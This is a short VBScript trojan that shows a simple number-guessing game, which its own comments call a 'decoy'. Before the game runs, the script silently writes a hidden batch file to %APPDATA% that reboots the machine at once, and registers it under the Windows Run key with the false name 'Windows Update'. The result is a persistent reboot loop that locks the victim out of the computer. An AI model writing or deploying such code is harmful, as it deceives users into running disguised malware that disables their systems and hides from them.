Option Explicit
On Error Resume Next

Set oFileSystem = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")

' Install the reboot script
app_data = WshShell.ExpandEnvironmentStrings("%APPDATA%")
full_install = app_data & "\winupdate.bat"
If Not oFileSystem.FileExists(full_install) Then
	Set reboot_script = oFileSystem.CreateTextFile(full_install)
	reboot_script.WriteLine("shutdown -r -t 00")
	reboot_script.Close()
	WshShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Windows Update", full_install, "REG_SZ"
	
	Set rs_map = oFileSystem.GetFile(full_install)
	rs_map.Attributes = 2
End If

' Decoy game to execute

' This game is a slightly modified version of the random number game in the book:
' Microsoft WSH and VBScript Programming for the Absolute Beginner (2014, ch. 6)
Sub NumbersGame
	done = False
	total_guesses = 0
	Randomize
	target = FormatNumber(Int((100 * Rnd) + 1))
	Do Until done
		input = InputBox("Type your guess:", "Pick a number between 1 and 100")
		total_guesses = total_guesses + 1	
		If Len(input) <> 0 Then
			If IsNumeric(input) Then
				If FormatNumber(input) = target Then
					MsgBox("Yes, the random number is " & input & " and it took you " & total_guesses & " guesses to get there!")
					done = True
				End If
				If FormatNumber(input) < target Then
					MsgBox("Your guess is too small")
				End If
				If FormatNumber(input) > target Then
					MsgBox("You guess is too large")
				End If
			Else
				MsgBox("Please enter in a number.")
			End If
		Else
			MsgBox("Please play again soon!")
			done = True
		End If
	Loop
End Sub
Call NumbersGame
